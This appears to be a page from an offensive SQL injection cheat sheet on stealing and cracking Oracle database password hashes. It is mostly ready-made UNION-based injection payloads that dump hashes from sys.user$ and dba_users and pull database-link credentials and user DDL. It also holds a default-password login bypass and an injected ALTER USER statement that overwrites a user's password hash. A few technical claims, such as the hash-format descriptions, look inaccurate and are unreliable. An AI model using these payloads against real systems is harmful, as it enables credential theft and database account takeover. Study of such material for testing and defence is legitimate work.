---
title: Password Cracking
description: Techniques for extracting and cracking Oracle database password hashes
category: Advanced Techniques
order: 14
tags: ["password", "hash", "cracking", "authentication"]
lastUpdated: 2025-03-15
---

## Password Cracking

Oracle database implements various password hashing algorithms depending on the version. Extracting and cracking these password hashes can allow attackers to gain authenticated access to the database with legitimate credentials.

### Oracle Password Storage Evolution

Oracle's password hashing has evolved over versions:

| Oracle Version | Hash Format     | Description                                          | Storage Location |
| -------------- | --------------- | ---------------------------------------------------- | ---------------- |
| Oracle 7 - 10g | DES-based       | Username case-insensitive, password case-insensitive | USER$ table      |
| Oracle 11g     | SHA-1           | Includes password salt, case-sensitive               | USER$ table      |
| Oracle 12c+    | SHA-2 (SHA-512) | Strong salted hash with PBKDF2                       | USER$ table      |

### Password Hash Locations

The main locations for password hashes in Oracle:

```sql
-- System tables containing password hashes (requires elevated privileges)
SELECT name, password FROM sys.user$  -- Pre-11g
SELECT name, password, spare4 FROM sys.user$  -- 11g+
```

### SQL Injection Examples

#### Extracting Password Hashes

```sql
-- Basic hash extraction (pre-11g)
' UNION SELECT username, password FROM sys.user$--

-- 11g hash extraction (includes both hash types)
' UNION SELECT username, password || ':' || spare4 FROM sys.user$--

-- Extracting with limited privileges
' UNION SELECT name, password FROM sys.user$ WHERE name='SYSTEM'--
```

#### Accessing Hash Information via Data Dictionary Views

```sql
-- Through DBA_USERS (requires DBA privileges)
' UNION SELECT username, password FROM dba_users--

-- Through ALL_USERS (less information)
' UNION SELECT username, NULL FROM all_users--
```

### Understanding Oracle Hash Formats

#### Pre-11g Format (DES-based)

The format is typically a 16-character string:

```sql
-- Example output for user SCOTT with password tiger
-- Hash: F894844C34402B67
' UNION SELECT password FROM sys.user$ WHERE name='SCOTT'--
```

#### 11g Format (SHA-1 based)

The format is typically a longer string prefixed with 'S:':

```sql
-- Example output for 11g
-- S:8F2D65FB5547B71C8DA3760F10960428CD307B1C6271691FC55C1F56554A;
' UNION SELECT spare4 FROM sys.user$ WHERE name='SCOTT'--
```

#### 12c Format (SHA-512 based)

Even more complex hash format:

```sql
-- Example output for 12c
-- T:4D2F59626B3D213A322E213B6C666B24384D3A215F7A215867;64487B255554487C532852...
' UNION SELECT spare4 FROM sys.user$ WHERE name='SCOTT'--
```

### Password Cracking Techniques

#### Dictionary Attacks

```sql
-- Checking if password hash matches known values
' UNION SELECT username, CASE WHEN password='F894844C34402B67' THEN 'Password is tiger' ELSE 'Unknown' END FROM sys.user$ WHERE name='SCOTT'--
```

#### Rainbow Table Attacks

Pre-computed hash tables can be used for cracking older Oracle hashes:

```sql
-- Extract hash for offline cracking
' UNION SELECT 'Hash for '||name||': '||password FROM sys.user$ WHERE name='SYSTEM'--
```

### Hash Manipulation Techniques

#### Hash Validation

```sql
-- Testing if a specific hash format is being used
' UNION SELECT CASE WHEN SUBSTR(password,1,2)='S:' THEN '11g Hash' WHEN LENGTH(password)=16 THEN 'Pre-11g Hash' ELSE 'Unknown' END, NULL FROM sys.user$ WHERE rownum=1--
```

#### Password Salting Detection

```sql
-- Check if 11g or 12c salted hashes are used
' UNION SELECT CASE WHEN spare4 IS NOT NULL THEN 'Using Salted Hashes' ELSE 'Using Old Hash Format' END, NULL FROM sys.user$ WHERE rownum=1--
```

### Advanced Extraction Techniques

#### Using DBMS_METADATA

If you have appropriate privileges:

```sql
-- Extract full user creation SQL (includes passwords)
' UNION SELECT DBMS_METADATA.GET_DDL('USER', username), NULL FROM all_users WHERE username='SYSTEM'--
```

#### Using Database Links

Database links often store credentials in plaintext:

```sql
-- Extract database link credentials
' UNION SELECT db_link, username || DECODE(password, NULL, '', ':' || password) FROM all_db_links--
```

### Password Policy Information

```sql
-- Extract password policy settings
' UNION SELECT PARAMETER_NAME, VALUE FROM DBA_PROFILES WHERE PROFILE='DEFAULT' AND RESOURCE_TYPE='PASSWORD'--

-- Check failed login attempts
' UNION SELECT username, account_status, lock_date, expiry_date FROM dba_users--
```

### Default and Known Password Checks

```sql
-- Check for default accounts with default passwords
' UNION SELECT username, account_status FROM dba_users WHERE username IN ('SYS','SYSTEM','OUTLN','DBSNMP','MDSYS','CTXSYS')--

-- Check for defaults (simple injection)
' OR username='SYSTEM' AND password='MANAGER'--
```

### Targeting Pre-11g Systems

```sql
-- Extract all hashes
' UNION SELECT name || ':' || password, NULL FROM sys.user$--

-- Target common admin accounts
' UNION SELECT password, NULL FROM sys.user$ WHERE name IN ('SYS','SYSTEM','ADMIN')--
```

### Targeting 11g+ Systems

```sql
-- Extract dual-format hashes
' UNION SELECT name || ':' || password || ':' || spare4, NULL FROM sys.user$--
```

### Password Authentication Bypass Techniques

#### Using AUTHID CURRENT_USER

```sql
-- Testing for procedures with invoker rights that might bypass authentication
' UNION SELECT OWNER || '.' || OBJECT_NAME, OBJECT_TYPE FROM ALL_OBJECTS WHERE OBJECT_TYPE IN ('PROCEDURE', 'FUNCTION') AND OWNER != 'SYS'--
```

#### Using IDENTIFIED BY VALUES

If you can modify user accounts:

```sql
-- Directly setting password hash (requires privileges)
' BEGIN EXECUTE IMMEDIATE 'ALTER USER target_user IDENTIFIED BY VALUES ''F894844C34402B67'''; END;--
```
